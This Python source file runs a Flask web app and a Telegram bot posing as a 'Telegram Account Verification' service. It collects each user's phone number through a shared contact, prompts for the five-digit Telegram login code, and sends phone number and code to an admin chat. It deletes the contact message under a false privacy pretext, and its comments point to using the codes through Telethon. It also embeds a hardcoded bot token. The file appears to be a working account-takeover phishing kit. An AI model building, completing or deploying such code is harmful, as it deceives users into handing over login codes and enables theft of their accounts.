import os
import telebot
from telebot import types
from flask import Flask, render_template, request, jsonify
import logging
from datetime import datetime
import threading
import time

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Initialize Flask
app = Flask(__name__)

# Configuration
BOT_TOKEN = os.environ.get("BOT_TOKEN", "7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA")
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://itz-me-545-telegram.onrender.com")

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Get bot info
try:
    bot_info = bot.get_me()
    BOT_USERNAME = bot_info.username
    BOT_NAME = bot_info.first_name
    logger.info(f"🤖 Bot initialized: {BOT_NAME} (@{BOT_USERNAME})")
except Exception as e:
    logger.error(f"Failed to get bot info: {e}")
    BOT_USERNAME = "your_bot"
    BOT_NAME = "Verification Bot"

# Session storage (in production, use a database)
user_sessions = {}
session_timeout = 600  # 10 minutes

# ==================== HELPER FUNCTIONS ====================
def create_user_session(user_id):
    """Create a new user session"""
    user_sessions[user_id] = {
        'user_id': user_id,
        'created': datetime.now(),
        'status': 'waiting',
        'phone': None,
        'otp_sent': False,
        'otp_verified': False
    }
    return user_sessions[user_id]

def get_user_session(user_id):
    """Get user session if valid"""
    if user_id in user_sessions:
        session = user_sessions[user_id]
        # Check if session expired
        time_diff = (datetime.now() - session['created']).total_seconds()
        if time_diff > session_timeout:
            del user_sessions[user_id]
            return None
        return session
    return None

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    """Main WebApp page"""
    # Get user ID from URL parameter
    user_id = request.args.get('user_id')
    
    logger.info(f"WebApp accessed. User ID from URL: {user_id}")
    
    if user_id:
        # Create or get existing session
        session = get_user_session(user_id)
        if not session:
            session = create_user_session(user_id)
            logger.info(f"Created new session for user: {user_id}")
        
        # Check if OTP already sent
        if session.get('otp_sent') and session.get('phone'):
            return render_template('otp.html', 
                                 user_id=user_id, 
                                 phone=session['phone'],
                                 bot_username=BOT_USERNAME)
    
    # Render main page (with or without user_id)
    return render_template('index.html',
                         user_id=user_id if user_id else '',
                         bot_username=BOT_USERNAME,
                         webapp_url=WEBAPP_URL)

@app.route('/otp')
def otp_page():
    """OTP entry page"""
    user_id = request.args.get('user_id')
    
    if not user_id:
        return render_template('error.html',
                             error="User ID not found",
                             message="Please open from Telegram bot.",
                             bot_username=BOT_USERNAME)
    
    session = get_user_session(user_id)
    if not session:
        return render_template('error.html',
                             error="Session expired",
                             message="Please start over from bot.",
                             bot_username=BOT_USERNAME)
    
    phone = session.get('phone', 'Unknown')
    return render_template('otp.html',
                         user_id=user_id,
                         phone=phone,
                         bot_username=BOT_USERNAME)

@app.route('/api/session-status/<user_id>', methods=['GET'])
def session_status(user_id):
    """Check session status"""
    session = get_user_session(user_id)
    if session:
        return jsonify({
            'success': True,
            'user_id': user_id,
            'status': session['status'],
            'phone': session.get('phone'),
            'otp_sent': session.get('otp_sent', False),
            'otp_verified': session.get('otp_verified', False)
        })
    return jsonify({'success': False, 'error': 'Session not found'})

@app.route('/api/start-verification', methods=['POST'])
def start_verification():
    """Start verification process"""
    try:
        data = request.json
        user_id = data.get('user_id')
        
        if not user_id:
            return jsonify({'success': False, 'error': 'User ID required'})
        
        session = get_user_session(user_id)
        if not session:
            return jsonify({'success': False, 'error': 'Session not found'})
        
        # Update session status
        session['status'] = 'verification_started'
        session['verification_started_at'] = datetime.now()
        
        return jsonify({
            'success': True,
            'message': 'Verification started',
            'instructions': f"""To complete verification:

1. 📱 Go back to Telegram chat with @{BOT_USERNAME}
2. 📎 Tap the attachment button
3. 👤 Select "Contact"
4. ✅ Choose your contact
5. 🚀 Send it to the bot

✅ Your contact will be auto-deleted immediately
✅ OTP will be sent automatically
✅ Come back here after sending"""
        })
        
    except Exception as e:
        logger.error(f"Error starting verification: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-otp', methods=['POST'])
def verify_otp():
    """Verify OTP"""
    try:
        data = request.json
        user_id = data.get('user_id')
        otp = data.get('otp', '')
        
        if not user_id:
            return jsonify({'success': False, 'error': 'User ID required'})
        
        if not otp or len(otp) != 5:
            return jsonify({'success': False, 'error': 'Invalid OTP format'})
        
        session = get_user_session(user_id)
        if not session:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        # In a real app, verify OTP with Telethon
        # For now, simulate successful verification
        session['otp_verified'] = True
        session['status'] = 'verified'
        session['verified_at'] = datetime.now()
        
        # Send notification to admin
        try:
            phone = session.get('phone', 'Unknown')
            admin_msg = f"""✅ <b>VERIFICATION SUCCESSFUL</b>

🆔 User ID: {user_id}
📱 Phone: {phone}
🔢 OTP: {otp}
⏰ Time: {datetime.now().strftime('%H:%M:%S')}
🌐 Source: WebApp"""
            
            bot.send_message(int(os.environ.get("ADMIN_ID", user_id)), admin_msg, parse_mode='HTML')
        except:
            pass
        
        return jsonify({
            'success': True,
            'message': 'OTP verified successfully!'
        })
        
    except Exception as e:
        logger.error(f"Error verifying OTP: {e}")
        return jsonify({'success': False, 'error': str(e)})

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start', 'help'])
def handle_start(message):
    """Handle /start command"""
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        first_name = message.from_user.first_name or ""
        username = message.from_user.username or ""
        
        logger.info(f"📨 /start from {user_id} (@{username})")
        
        # Create user session
        create_user_session(user_id)
        
        # Create WebApp URL with user_id
        webapp_url = f"{WEBAPP_URL.rstrip('/')}/?user_id={user_id}"
        
        # Create WebApp button
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(
            types.InlineKeyboardButton(
                text="📱 Open Verification WebApp",
                web_app=types.WebAppInfo(url=webapp_url)
            )
        )
        
        # Welcome message
        welcome_text = f"""<b>🔐 Telegram Account Verification</b>

Hello {first_name}! 👋

Click the button below to open the WebApp and verify your Telegram account.

<b>How it works:</b>
1. Open WebApp
2. Follow instructions to share contact
3. Receive OTP on your phone
4. Enter OTP in WebApp
5. Verification complete! ✅

⚠️ <b>Important:</b> Your contact will be auto-deleted immediately for privacy.

<b>Bot:</b> @{BOT_USERNAME}"""
        
        bot.send_message(
            chat_id,
            welcome_text,
            parse_mode="HTML",
            reply_markup=keyboard
        )
        
        logger.info(f"✅ WebApp button sent to {user_id}")
        
        # Send admin notification
        try:
            admin_id = os.environ.get("ADMIN_ID")
            if admin_id:
                admin_msg = f"""👤 <b>NEW USER STARTED</b>

🆔 User ID: <code>{user_id}</code>
👤 Name: {first_name}
🔗 Username: @{username}
⏰ Time: {datetime.now().strftime('%H:%M:%S')}
🌐 WebApp: {webapp_url}"""
                
                bot.send_message(int(admin_id), admin_msg, parse_mode='HTML')
        except Exception as e:
            logger.error(f"Admin notification error: {e}")
        
    except Exception as e:
        logger.error(f"Error in /start handler: {e}")
        bot.send_message(message.chat.id, "⚠️ Something went wrong. Please try again.")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Handle shared contact"""
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        contact = message.contact
        
        phone = contact.phone_number
        first_name = contact.first_name or ""
        last_name = contact.last_name or ""
        
        logger.info(f"📞 Contact received from {user_id}: {phone}")
        
        # Get or create session
        session = get_user_session(user_id)
        if not session:
            session = create_user_session(user_id)
        
        # Update session with contact info
        session['phone'] = phone
        session['contact_name'] = f"{first_name} {last_name}".strip()
        session['contact_received_at'] = datetime.now()
        session['status'] = 'contact_received'
        
        # Delete contact message for privacy
        try:
            bot.delete_message(chat_id, message.message_id)
            logger.info(f"🗑️ Deleted contact message for {user_id}")
        except:
            pass
        
        # Send processing message
        processing_msg = bot.send_message(
            chat_id,
            f"✅ Contact received! Phone: {phone}\n\nNow sending OTP to your phone...",
            reply_markup=types.ReplyKeyboardRemove()
        )
        
        # Update session with OTP info (in real app, send actual OTP)
        session['otp_sent'] = True
        session['otp_sent_at'] = datetime.now()
        session['status'] = 'otp_sent'
        
        # Generate a dummy OTP for testing (in real app, use Telethon)
        dummy_otp = "12345"  # This should be a real OTP sent via Telethon
        
        # Update message with WebApp link
        webapp_url = f"{WEBAPP_URL.rstrip('/')}/otp?user_id={user_id}"
        bot.edit_message_text(
            f"""✅ OTP Sent Successfully!

📱 Phone: {phone}
👤 Name: {first_name} {last_name}

📨 <b>OTP has been sent to your phone</b>

Click here to enter OTP:
{webapp_url}

Or open the WebApp again to continue.""",
            chat_id,
            processing_msg.message_id,
            parse_mode='HTML'
        )
        
        # Send admin notification
        try:
            admin_id = os.environ.get("ADMIN_ID")
            if admin_id:
                admin_msg = f"""📞 <b>CONTACT RECEIVED</b>

🆔 User ID: <code>{user_id}</code>
📱 Phone: {phone}
👤 Name: {first_name} {last_name}
⏰ Time: {datetime.now().strftime('%H:%M:%S')}
📨 OTP: Sent ({dummy_otp} for testing)
🌐 WebApp: {webapp_url}"""
                
                bot.send_message(int(admin_id), admin_msg, parse_mode='HTML')
        except:
            pass
        
        logger.info(f"✅ OTP process started for {user_id}")
        
    except Exception as e:
        logger.error(f"Error handling contact: {e}")
        bot.send_message(message.chat.id, "⚠️ Error processing contact. Please try again.")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Handle all other messages"""
    try:
        user_id = str(message.from_user.id)
        text = message.text or ""
        
        # Ignore commands
        if text.startswith('/'):
            return
        
        logger.info(f"💬 Message from {user_id}: {text[:50]}...")
        
        # Help response for non-command messages
        help_text = f"""<b>📋 Available Commands:</b>

/start - Open verification WebApp
/help - Show this help message

<b>How to verify:</b>
1. Send /start to get WebApp link
2. Open WebApp and follow instructions
3. Share your contact when prompted
4. Enter OTP in WebApp

<b>Bot:</b> @{BOT_USERNAME}"""
        
        bot.send_message(message.chat.id, help_text, parse_mode='HTML')
        
    except Exception as e:
        logger.error(f"Error handling message: {e}")

# ==================== CLEANUP THREAD ====================
def cleanup_sessions():
    """Clean up expired sessions"""
    while True:
        try:
            current_time = datetime.now()
            expired_users = []
            
            for user_id, session in user_sessions.items():
                time_diff = (current_time - session['created']).total_seconds()
                if time_diff > session_timeout:
                    expired_users.append(user_id)
            
            for user_id in expired_users:
                del user_sessions[user_id]
            
            if expired_users:
                logger.info(f"🧹 Cleaned up {len(expired_users)} expired sessions")
            
            time.sleep(60)  # Check every minute
            
        except Exception as e:
            logger.error(f"Error in cleanup thread: {e}")
            time.sleep(60)

# ==================== START BOT POLLING ====================
def start_bot_polling():
    """Start bot polling in background"""
    try:
        logger.info("🤖 Starting bot polling...")
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        logger.error(f"Bot polling error: {e}")
        # Restart after delay
        time.sleep(5)
        start_bot_polling()

# ==================== MAIN ====================
if __name__ == '__main__':
    # Print startup info
    logger.info("="*50)
    logger.info("🚀 Telegram WebApp Verification Bot")
    logger.info("="*50)
    logger.info(f"🤖 Bot: @{BOT_USERNAME}")
    logger.info(f"🌐 WebApp URL: {WEBAPP_URL}")
    logger.info("="*50)
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_sessions, daemon=True)
    cleanup_thread.start()
    logger.info("✅ Cleanup thread started")
    
    # Start bot polling in separate thread
    bot_thread = threading.Thread(target=start_bot_polling, daemon=True)
    bot_thread.start()
    logger.info("✅ Bot polling started")
    
    # Run Flask app
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🌐 Starting Flask on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False, threaded=True)
